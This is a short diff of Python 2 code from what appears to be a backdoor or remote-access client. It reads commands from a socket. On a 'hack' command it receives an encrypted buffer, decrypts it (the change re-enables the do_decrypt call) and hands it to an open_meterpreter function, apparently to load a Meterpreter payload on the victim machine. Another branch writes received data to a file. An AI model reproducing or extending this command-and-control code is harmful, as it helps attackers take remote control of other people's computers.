@@ -68,7 +68,7 @@ while True :
             f.write(buf)
     elif "hack" in command:
         buf = s.recv(10000)
-        #buf = do_decrypt(buf)
+        buf = do_decrypt(buf)
         open_meterpreter(bytearray(buf))
         print "sigue"
     else:
